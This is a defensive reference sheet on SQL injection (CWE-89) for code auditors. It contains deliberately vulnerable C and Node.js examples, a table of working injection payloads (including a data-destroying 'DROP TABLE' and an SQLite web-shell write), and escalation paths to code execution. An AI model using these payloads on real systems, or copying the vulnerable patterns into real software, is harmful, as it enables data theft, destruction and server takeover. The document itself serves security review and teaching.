# CWE-89: SQL Injection

## What It Is

SQL injection occurs when user input is concatenated into SQL query strings without proper
parameterization. The attacker modifies the query logic to extract data, bypass
authentication, modify records, or in some cases execute OS commands. It remains the most
common critical vulnerability in web applications and embedded device management interfaces.

## Code Patterns to Look For

### Decompiled C / Native Binaries

```c
// Direct string concatenation into SQL
snprintf(query, sizeof(query), "SELECT * FROM users WHERE name='%s'", username);
sqlite3_exec(db, query, callback, 0, &err);

// sqlite3_prepare without bind
snprintf(sql, 512, "INSERT INTO logs VALUES ('%s', '%s')", ip, action);
sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
sqlite3_step(stmt);

// MySQL C API
sprintf(query, "SELECT pass FROM users WHERE user='%s'", user);
mysql_query(conn, query);
```

In Ghidra/IDA, look for:
- `sqlite3_exec`, `sqlite3_prepare_v2`, `mysql_query`, `PQexec` called with a buffer
  that was built via `sprintf`/`snprintf`/`strcat`.
- CGI parameter parsing (e.g., `getenv("QUERY_STRING")`) flowing into SQL strings.
- ATTACH DATABASE in SQLite (file write primitive).
- `sqlite3_load_extension` imported (can escalate SQLite injection to RCE).

### JavaScript / Node.js

```javascript
// String concatenation
db.query("SELECT * FROM users WHERE id = " + req.params.id);
db.query(`SELECT * FROM users WHERE name = '${req.body.name}'`);

// Sequelize raw query
sequelize.query("SELECT * FROM users WHERE email = '" + email + "'");

// MongoDB NoSQL injection (different CWE but related)
db.collection('users').find({ username: req.body.username, password: req.body.password });
// Exploit: { "password": { "$gt": "" } }
```

## Example Vulnerable Code

### C (embedded device admin panel)

```c
// VULNERABLE: auth bypass via SQL injection
int check_login(sqlite3 *db, char *user, char *pass) {
    char query[512];
    snprintf(query, sizeof(query),
        "SELECT COUNT(*) FROM admins WHERE username='%s' AND password='%s'",
        user, pass);
    int count = 0;
    sqlite3_exec(db, query, count_callback, &count, NULL);
    return count > 0;
}
// Exploit: user = admin' OR '1'='1' --
// Query becomes: SELECT COUNT(*) FROM admins WHERE username='admin' OR '1'='1' --' AND ...
```

### JavaScript

```javascript
// VULNERABLE: data extraction via UNION
app.get('/product', (req, res) => {
    const id = req.query.id;
    const sql = "SELECT name, price FROM products WHERE id = " + id;
    db.all(sql, (err, rows) => res.json(rows));
});
// Exploit: id = 0 UNION SELECT username, password FROM users --
```

## Example Safe Code

### C

```c
int check_login(sqlite3 *db, char *user, char *pass) {
    const char *sql = "SELECT COUNT(*) FROM admins WHERE username=? AND password=?";
    sqlite3_stmt *stmt;
    sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
    sqlite3_bind_text(stmt, 1, user, -1, SQLITE_STATIC);
    sqlite3_bind_text(stmt, 2, pass, -1, SQLITE_STATIC);
    int count = 0;
    if (sqlite3_step(stmt) == SQLITE_ROW)
        count = sqlite3_column_int(stmt, 0);
    sqlite3_finalize(stmt);
    return count > 0;
}
```

### JavaScript

```javascript
app.get('/product', (req, res) => {
    const id = parseInt(req.query.id, 10);
    if (isNaN(id)) return res.status(400).send('Invalid ID');
    db.all("SELECT name, price FROM products WHERE id = ?", [id], (err, rows) => {
        res.json(rows);
    });
});
```

## Common Bypasses

| Technique | Payload Example | Purpose |
|-----------|----------------|---------|
| UNION injection | `' UNION SELECT 1,username,password FROM users--` | Extract data from other tables |
| Blind boolean | `' AND (SELECT substr(password,1,1) FROM users LIMIT 1)='a'--` | Char-by-char extraction |
| Blind time-based | `'; WAITFOR DELAY '0:0:5'--` (MSSQL) or `AND sleep(5)` (MySQL) | Confirm injection without output |
| Error-based | `' AND extractvalue(1,concat(0x7e,(SELECT version())))--` | Leak data via error messages |
| Stacked queries | `'; DROP TABLE users; --` | Execute multiple statements |
| Second-order | Store `admin'--` in profile name; triggers when name is used in a later query | Bypass input validation at submission time |
| ATTACH DATABASE | `'; ATTACH DATABASE '/tmp/shell.php' AS x; CREATE TABLE x.y(z TEXT); INSERT INTO x.y VALUES('<?php system($_GET["c"]);?>');--` | SQLite file write to RCE |
| Comment tricks | `/**/UNION/**/SELECT` | Bypass WAF keyword filters |
| Case variation | `uNiOn SeLeCt` | Bypass case-sensitive filters |
| Char encoding | `CHAR(97,100,109,105,110)` | Bypass string literal filters |
| Hex encoding | `0x61646d696e` | MySQL hex string bypass |
| No-space | `'UNION(SELECT(1),(2))--` | Bypass space filters with parentheses |

**Database-specific escalation:**
- **SQLite**: ATTACH DATABASE for file write, `sqlite3_load_extension` for code exec.
- **MySQL**: `INTO OUTFILE` for file write, `LOAD_FILE()` for read, UDF for code exec.
- **PostgreSQL**: `COPY ... TO`, `lo_export`, `pg_read_file`, `CREATE FUNCTION` with C library.
- **MSSQL**: `xp_cmdshell`, `OPENROWSET`, `sp_oacreate`.

## Assessment Checklist

1. [ ] Is user input concatenated into SQL strings (sprintf, snprintf, string +, template literal)?
2. [ ] Does the code use parameterized queries / prepared statements with bind variables?
3. [ ] Can the attacker reach the injection point without authentication?
4. [ ] Does the database support stacked queries (multiple statements in one call)?
5. [ ] Is `sqlite3_load_extension` or equivalent enabled?
6. [ ] Is there a UNION injection path (does the output include query results)?
7. [ ] Can the database write files to disk (ATTACH DATABASE, INTO OUTFILE, COPY TO)?
